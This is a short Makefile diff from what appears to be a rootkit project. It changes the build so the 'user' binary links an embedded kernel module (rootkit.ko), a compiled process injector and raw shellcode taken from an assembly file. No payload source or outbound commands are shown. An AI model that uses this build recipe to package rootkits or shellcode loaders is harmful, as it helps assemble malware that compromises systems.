@@ -9,7 +9,11 @@ all: module user
 
 user: module
 	ld -s -r -b binary rootkit.ko -o rootkit.ko.o
-	gcc user.c rootkit.ko.o -o user
+	gcc injector.c -c -o injector.o
+	gcc -c shellcode.s -o shellcode.o
+	objcopy -O binary --only-section=.text shellcode.o shellcode.bin
+	ld -s -r -b binary shellcode.bin -o shellcode.o
+	gcc user.c rootkit.ko.o injector.o shellcode.o  -o user
 
 module:
 	$(MAKE) -C $(KDIR) M=$(PWD) modules
